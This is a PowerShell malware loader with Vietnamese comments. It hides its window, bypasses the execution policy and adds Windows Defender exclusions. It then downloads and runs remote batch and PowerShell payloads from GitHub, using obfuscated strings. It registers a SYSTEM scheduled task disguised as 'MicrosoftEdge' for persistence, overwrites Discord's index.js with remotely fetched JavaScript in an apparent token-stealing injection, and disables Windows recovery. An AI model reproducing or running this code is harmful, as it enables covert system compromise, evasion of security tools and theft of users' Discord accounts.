Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@
# aaaa
[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force

$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
$startupfolder = $env:appdata
Add-Type -AssemblyName System.Windows.Forms


# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        
        $outputFile = "$startupfolder\download.bat"
        

        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}

$AppId = "haideptrai"
$mutexName = "Global\$AppId"
$CreatedNew = $false

try {
    # Kiểm tra xem Mutex đã tồn tại chưa
    $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
    Write-Host "[!] An instance of this script is already running."
    Stop-Process -Id $PID -Force
} catch {
    # Nếu Mutex chưa tồn tại, tạo mới
    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$CreatedNew)
}

# Nếu không tạo được Mutex mới, thoát script
if (-not $CreatedNew) {
    Write-Host "[!] Another instance is already running."
    Stop-Process -Id $PID -Force
}

Remove-Item -Path "$startupfolder\download.bat" -Force
Add-MpPreference -ExclusionProcess "powershell.exe"

$task_name = "MicrosoftEdge"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green



$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir






$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/downloadfile.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

# Invoke-WebRequest -Uri "https://github.com/manyak-cmd/a/raw/refs/heads/main/main.exe" -OutFile "$dir\simplecode.exe"; Start-Process "$dir\simplecode.exe"


$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

foreach ($path in $discPaths) {
    $skibidipath = Join-Path $locAppData $path
    if (-not (Test-Path $skibidipath)) {
        continue
    }

    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
            $files = Get-ChildItem $_.FullName
            foreach ($file in $files) {
                if ($file.Name -eq "index.js") {
                    try {
                        # Download content from the specified URL
                        $webClient = New-Object System.Net.WebClient
                        $content = $webClient.DownloadString("https://gist.githubusercontent.com/43a1723/45eaf5d60790b53092841ee6cdf5aea1/raw/a69821c4379655c84d529b91b83256b09b39577c/lmao.js")
                        
                        if ($content -ne "") {
                            # Write the downloaded content to the index.js file
                            $content | Set-Content -Path $file.FullName -Force
                            Write-Host "Updated $($file.FullName) successfully." -ForegroundColor Green
                        } else {
                            Write-Host "Downloaded content is empty. Skipping file: $($file.FullName)" -ForegroundColor Yellow
                        }
                    } catch {
                        Write-Host "Error occurred while processing $($file.FullName): $_" -ForegroundColor Red
                    }
                }
            }
        }
    }
}


if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    reagentc.exe /disable
} else {
    echo "Not running as Admin"
}
